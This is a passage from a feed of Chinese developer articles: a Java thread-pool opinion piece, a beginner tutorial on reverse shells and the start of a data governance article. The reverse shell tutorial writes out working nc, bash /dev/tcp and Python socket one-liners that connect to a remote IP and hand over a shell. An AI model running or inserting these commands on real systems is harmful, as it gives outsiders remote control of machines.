mdtype=&quot;paragraph&quot;&gt;&lt;em&gt;&lt;span&gt;https://github.com/features/copilot&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p cid=&quot;n374&quot; mdtype=&quot;paragraph&quot;&gt;&lt;em&gt;&lt;span&gt;https://github.com/huggingface/transformers&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;section class=&quot;mp_profile_iframe_wrp&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;MzIwODkxOTA1Nw==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/TpAfliaLqyRJDMaA2zxO28ARbQj8zbupLjyvaSQ01uHu3ficgQvwNxhJUfDTzp4kDCc8d4jH8Kia6BickXz2LZM4NQ/0?wx_fmt=png&quot; data-nickname=&quot;GitCube&quot; data-alias=&quot;GitCube&quot; data-signature=&quot;专注于分享 Python、Java、AI、Web 等多个计算机科学领域的优质学习资源及开发者工具。&quot; data-from=&quot;0&quot;/&gt;&lt;/section&gt;
          &lt;/div&gt;

          

          



           
                                
                    
        &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>8d9715f1699224592a22fc6636e38da9</guid>
<title>阿里规约手动创建线程池，我为什么还继续使用Executors呢？</title>
<link>https://toutiao.io/k/owwky6z</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content                                       &quot; id=&quot;js_content&quot;&gt;
            &lt;section data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.69&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/Z85sZvtmju13RJgyiaBJtf4u0JJn7fthqw8M68UfJ3FmKgFMjmgetkOsFZXG5lF6iayYrW0IC9764XNAew3Dn37g/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;500&quot;/&gt;&lt;/section&gt;&lt;section draggable=&quot;false&quot; data-tools-id=&quot;77768&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;事先声明&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;题目并没有哗众取宠的意思，我确实有在用&lt;/span&gt;&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;创建线程池。本文也不会赘述有关线程池参数，线程状态等概念。&lt;/span&gt;&lt;/section&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;尽管我知道阿里规约手动创建线程池背后的深意，通过ThreadPoolExecutor创建线程池可以让使用者更加明确线程池的运行规则，规避资源耗尽的风险。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;资源耗尽的风险&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;资源耗尽的风险主要还是源于内存：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、使用&lt;span&gt;Executors&lt;/span&gt;.newFixedThreadPool和&lt;span&gt;Executors&lt;/span&gt;.&lt;span&gt;newSingleThreadExecutor&lt;/span&gt;创建的线程池，等待队列默认值是&lt;/span&gt;&lt;span&gt;Integer.MAX_VALUE，基本等同于无&lt;/span&gt;&lt;span&gt;界&lt;/span&gt;&lt;span&gt;的队列。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;毋庸置疑，线程数肯定是有限的，尤其对于密集计算型任务，线程数设置太大只会徒增线程消耗，并不会提高任务执行效率。&lt;/span&gt;&lt;span&gt;如果请求量过大，大量的请求数据堆积在队列中，极有可能发生OOM。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、使用&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;newCachedThreadPool&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;newSingleThreadScheduledExecutor&lt;/span&gt;&lt;span&gt;创建的线程池，最大线程数是&lt;/span&gt;Integer.MAX_VALUE&lt;span&gt;，&lt;/span&gt;&lt;/span&gt;&lt;span&gt;基本等同于无限大。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;对于大量的请求，无限的创建线程，&lt;/span&gt;&lt;span&gt;ThreadStackSize按1024k算，极有可能发生OOM。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;为什么我使用&lt;/span&gt;&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;创建线程池&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;原因有两个：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、不喜欢各类的条条框框，Java包括Java生态圈本身已经有很多规约了，还需要阿里再来一套规约？&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、Java既然自带了这样的线程池工具，应该有用武之地。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;我个人看来，使用&lt;span&gt;Executors&lt;/span&gt;和直接使用&lt;span&gt;ThreadPoolExecutor&lt;/span&gt;并没有本质区别，更多的关注还应该放在任务本身。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;假设使用&lt;span&gt;Executors&lt;/span&gt;创建的线程池会出现OOM，那么采用&lt;span&gt;ThreadPoolExecutor&lt;/span&gt;就能规避吗？答案大概率是否定的。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;几点使用线程池的考虑&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;我通常会先考虑以下几点：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、任务偏IO还是偏计算&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、通常程序线程池用来处理小而多批量任务&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;3、线程数量和CPU核数相呼应&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;4、请求量多少和请求量大小&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;5、定时监控线程池当前运行状态&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;6、线程数量可以动态设置&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;7、适当的控制线程数&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;8、任务耗时的话尽量去拆分或优化&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;场景假设&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;先来看个场景，假设A会持续向B推送数据，量级为1亿，payload为100B；B收到数据后进行应答后，A会继续向B推送；为了A不影响数据推送，&lt;/span&gt;&lt;span&gt;B会直接应答，然后线程池异步处理A推送来的数据。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;可能假设场景有些鸡肋，但现实也不乏这种场景，将就着看吧。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;假设使用&lt;span&gt;Executors&lt;/span&gt;.newFixedThreadPool创建线程数为10的线程池，单个线程执行一次任务耗时10ms，想想看，5min中后，&lt;/span&gt;&lt;span&gt;线程池处理了10*100*300个任务，忽略线程切换带来的损耗，累计处理30w个任务。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;剩下还有约1亿的数据堆积到了队列中。&lt;/span&gt;&lt;span&gt;100B*100000000/1024，大约9g的数据，绝对&lt;/span&gt;&lt;span&gt;OOM了。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;问题的根本原因&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;那问题来了，使用&lt;span&gt;ThreadPoolExecutor的话&lt;/span&gt;我应该开多少个线程？队列应该设置多大？数据来了线程满了，队列满了，直接丢弃数据？还是业务线程本身继续执行？&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;这个时候线程基本已经忙不过来了，CPU狂飙，内存OOM。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;分析现状解决问题&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;显然这个时候需要把速度降下来，而不是无脑提交到线程池中。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;我们对照上面几点重新优化下这个程序流程：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、任务是偏计算型的，4核开10个线程还算合理，可以动态设置线程数再进行调试&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、请求量总大小大约10g，对于8g内存的应用，考虑占用1g内存，大约10000个任务数据&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;3、使用&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;newSingleThreadScheduledExecutor&lt;/span&gt;定时监控线程池的状态&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;针对上面的无脑分析&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、我们使用&lt;span&gt;Executors&lt;/span&gt;.newFixedThreadPool和&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;newSingleThreadScheduledExecutor&lt;/span&gt;，前者用来执行任务，后者用来定时输出线程池状态&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、B端协商A端，每次推送1000个数据，10个线程处理10000个，使用信号量严格控制，数据不进队列；&lt;/span&gt;&lt;span&gt;亦或使用信号量控制，队列至多进入10000个数据；&lt;/span&gt;&lt;span&gt;信号量大小为10000+线程数&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;3、动态设置线程池最大线程数，定时监控线程池状态，没什么神奇，线程池提供了这样的方法&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;总结&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;以上就是本文所要阐述的观点，主要想表达以下几点：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、任何规约不要盲从&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、尽可能多地关注自己的业务数据&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;3、合理利用线程池&lt;/span&gt;&lt;/p&gt;
          &lt;/div&gt;

          

          



           
                          
              &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>d2bbddb8bd4db6583444cd020d4e4a02</guid>
<title>什么是反弹 Shell？</title>
<link>https://toutiao.io/k/ltdnh1m</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;section data-tool=&quot;mdnice编辑器&quot; data-website=&quot;https://www.mdnice.com&quot;&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-galleryid=&quot;&quot; data-ratio=&quot;0.6666666666666666&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/atOH362BoyvhaOicxWgZtxUs5b44yCmIap0MkUAcj4y5xYd0ZI62DiaJPkopWHqKcUIyiaZ6lvb1hmH2MjyrNCG5g/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;section&gt;&lt;span/&gt;&lt;/section&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;前段时间被一位产品经理嘲笑了，说我居然连反弹 Shell 都不知道&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;说实话当时我还真不知道，但这口气咽不下去啊，得赶紧学来看看，这不，我已经学会了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;学完之后我特地来记录下，同时分享给大家，以后产品经理再也不敢嘲笑我们不懂反弹 Shell 了&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;什么是反弹 Shell&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们都知道 Shell 的概念吧，简单来说，Shell 就是实现用户命令的接口，通过这个接口我们就能实现对计算机的控制，比如我们常见的 ssh 就是执行的 Shell 命令实现对远程对服务器的控制&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;那反弹 Shell 是啥呢？&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;其英文名叫做 Reverse Shell，具体干什么的呢？就是控制端首先监听某个 TCP/UDP 端口，然后被控制端向这个端口发起一个请求，同时将自己命令行的输入输出转移到控制端，从而控制端就可以输入命令来控制被控端了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;比如说，我们有两台主机 A、B，我们最终想实现在 A 上控制 B。那么如果用正向 Shell，其实就是在 A 上输入 B 的连接地址，比如通过 ssh 连接到 B，连接成功之后，我们就可以在 A 上通过命令控制 B 了。如果用反向 Shell，那就是在 A 上先开启一个监听端口，然后让 B 去连接 A 的这个端口，连接成功之后，A 这边就能通过命令控制 B了&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;反弹 Shell 有什么用？&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;还是原来的例子，我们想用 A 来控制 B，如果想用 ssh 等命令来控制，那得输入 B 的 sshd 地址或者端口对吧？但是在很多情况下，由于防火墙、安全组、局域网、NAT 等原因，我们实际上是无法直接连接到 B 的&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;比如：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;A 虽然有公网 IP，但 B 是一个处于内网的机器，A 就没法直接连到 B 上&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;B 上开了防火墙或者安全组限制，sshd 的服务端口 22 被封闭了&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;B 是一台拨号主机，其 IP 地址经常变动&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;假如 B 被攻击了，我们想让 B 向 A 汇报自己的状况，那自然就需要 B 主动去连接 A&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果是这些情况，我们就可以用反弹 Shell 用 A 来控制 B 了&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;反弹 Shell 案例&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;首先我们先看一个标准的反弹 Shell 的例子，这里我们一共需要两台主机：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;A 是控制端，可以处于公网之中，也可以和 B 处于一个局域网中，总之能让 B 找到 A 就行&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;B 是被控端，可以处在局域网之中&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在开始之前我们需要用到 nc 命令，安装非常简单&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果是 CentOS 系列系统，安装命令如下：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;yum install -y nc # CentOS&lt;br/&gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果是 Ubuntu 系列系统，安装命令可以参考 &lt;span&gt;https://stackoverflow.com/questions/10065993/how-to-switch-to-netcat-traditional-in-ubuntu&lt;/span&gt;&lt;sup&gt;[1]&lt;/sup&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;接着，我们在 A 上执行如下命令：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;nc -lvp 32767&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这个命令的意思是开启 32767 的端口监听，运行之后如图所示：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.23426212590299278&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/DAE6TYB3GWibRnMC5leYoDDgwtiadCibTyLSnA1bhXjpJibxQTz00NicicCgGlHIRicnZGVOibX0GV2joTibEUhuX5ssKsQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1938&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这样就表明 A 上正在监听 32767 端口的连接了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这时候，我们可以在 B 上通过类似的命令连接到 A，假如 A 的 IP 是 111.112.113.114，那么命令如下：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;nc 111.112.113.114 32767 -e /bin/bash&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;“&lt;/span&gt;&lt;p&gt;注意：你在运行的时候需要替换成 A 的真实 IP 和端口。&lt;/p&gt;&lt;span&gt;”&lt;/span&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;运行完毕之后，我们反过来观察下 A，就显示了来自某个 IP 和端口的连接，我们就可以输入命令来控制 B 了，比如这里我们输入了：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;uname -a&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;然后就可以得到 B 的主机名了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如图所示：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.1930164888457808&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/DAE6TYB3GWibRnMC5leYoDDgwtiadCibTyLo2xjZjVK4K0zQLES6Vhqn9ugLVrU1OCItO1nZldlMp0tXibkpADdsXg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2062&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这样我们就通过 nc 包实现了反弹 Shell&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;有人说，这 B 上一定需要安装 nc 这个包吗？&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;其实不一定的，我们可以直接使用 bash 来实现反弹 Shell，命令如下：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/111.112.113.114/32767 0&amp;gt;&amp;amp;1&lt;br/&gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这个命令大致解释下：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;bash -i&lt;/code&gt; 就是产生一个 bash 交互环境&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;&amp;gt;&amp;amp;&lt;/code&gt;可以将 bash 交互环境的输入、输出、错误输出都输出到一个地方&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;/dev/tcp/111.112.113.114/32767&lt;/code&gt; 其实指的就是目标主机的一个连接地址，因为 Linux 环境中所有内容的定义都是以文件的形式存在的，指定这个地址就是让主机和目标主机建立一个 TCP 连接&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;0&amp;gt;&amp;amp;1&lt;/code&gt;可以将标准输入和标准输出相结合，重定向给前面标准输出的内容&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;通过这样的命令，我们就可以就是将 B的标准输出和错误输出都重定向给 A，并且将 A 的输入都重定向给 B，这样我们就可以实现 A 对 B 的远程控制了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如图所示：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.33751743375174337&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/DAE6TYB3GWibRnMC5leYoDDgwtiadCibTyLtcicvFS3wUrItkssuIibrrAiclOZ2lsRlI7bLw5QNZibvVuA9HV6MXnCxg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;717&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;比如这样我们就可以轻松在 A 主机上拿到 B 主机的主机名、当前所处路径等内容了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;另外除了用 bash，我们还可以利用 Python 进行反弹 Shell，脚本如下：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;python -c &#x27;import socket,subprocess,os; \&lt;br/&gt;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);&lt;br/&gt;s.connect((&quot;111.112.113.114&quot;,32767));&lt;br/&gt;os.dup2(s.fileno(),0);&lt;br/&gt;os.dup2(s.fileno(),1);&lt;br/&gt;os.dup2(s.fileno(),2);&lt;br/&gt;p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&lt;br/&gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;可以达到同样反弹 Shell 的效果，即可以用 A 来控制 B&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;总结&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;以上就是反弹 Shell 的介绍，灵活运用反弹 Shell 可以大大便利某些场景下的远程控制，希望对大家有帮助&lt;/p&gt;&lt;section class=&quot;mp_profile_iframe_wrp&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;MzU1OTI0NjI1NQ==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/atOH362BoyuUe1icelWmbMyTCRwoFPScmosYQheSZ9wsmr61Bfr2rvNav9j9QpDnUulNpCotEiaAoLzSAm4jZTjA/0?wx_fmt=png&quot; data-nickname=&quot;AirPython&quot; data-alias=&quot;AirPython&quot; data-signature=&quot;专注于Python爬虫/自动化/Web原创技术干货！&quot; data-from=&quot;0&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-tools=&quot;135编辑器&quot; data-id=&quot;93451&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-tools=&quot;135编辑器&quot; data-id=&quot;92877&quot;&gt;&lt;section&gt;&lt;br/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;section&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-tools=&quot;135编辑器&quot; data-id=&quot;93451&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-tools=&quot;135编辑器&quot; data-id=&quot;92877&quot;&gt;&lt;section data-width=&quot;100%&quot;&gt;&lt;section&gt;&lt;section data-brushtype=&quot;text&quot;&gt;&lt;span&gt;好文和朋友一起看~&lt;/span&gt;&lt;em/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;
          &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>dd791e912da31942de00e88902bc1b3c</guid>
<title>0到1搭建企业级数据治理体系</title>
<link>https://toutiao.io/k/kibmqqk</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;section data-tool=&quot;mdnice编辑器&quot; data-website=&quot;https://www.mdnice.com&quot; data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;section&gt;&lt;br/&gt;&lt;/section&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;数据治理是企业数据建设必不可少的一个环节。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;好的数据治理体系可以盘活整条数据链路，最大化保障企业数据的&lt;code&gt;采集&lt;/code&gt;、&lt;code&gt;存储&lt;/code&gt;、&lt;code&gt;计算&lt;/code&gt;和&lt;code&gt;使用&lt;/code&gt;过程的可控和可追溯。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如何构建企业数据治理体系？企业数据治理过程需要注意哪些问题？总体而言，不能一口一个胖子，路要一步一步地走。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;下面我将结合&lt;code&gt;企业级数据治理&lt;/code&gt;经验，详细介绍&lt;code&gt;从0到1&lt;/code&gt;搭建数据治理体系全流程，帮你梳理数据治理的主要内容以及过程中会遇到的哪些坑。&lt;/p&gt;&lt;p 